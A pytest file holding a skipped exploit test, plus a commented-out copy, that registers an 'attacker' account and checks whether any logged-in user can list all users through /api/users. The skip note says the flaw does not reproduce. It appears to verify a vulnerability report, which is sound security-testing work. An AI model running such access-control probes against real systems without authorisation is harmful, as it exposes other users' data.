
import pytest
from helpers import login, register

@pytest.mark.skip(reason="Current uploaded PHP code appears to restrict /api/users and /admin/users to global admin; this does not reproduce the provided vulnerability report.")
def test_exploit_any_authenticated_user_can_list_all_users(client):
    session, base_url = client
    assert register(session, base_url, "userlist_attacker", "pass123", "UserList Attacker").status_code == 200
    assert login(session, base_url, "userlist_attacker", "pass123").status_code == 200
    r = session.get(f"{base_url}/api/users", timeout=5)
    assert r.status_code == 200


# from helpers import login, register
#
#
# def test_exploit_any_authenticated_user_can_list_all_users(client):
#     session, base_url = client
#
#     assert register(session, base_url, "userlist_attacker", "pass123", "UserList Attacker").status_code == 200
#     assert login(session, base_url, "userlist_attacker", "pass123").status_code == 200
#
#     r = session.get(f"{base_url}/api/users", timeout=5)
#     assert r.status_code == 200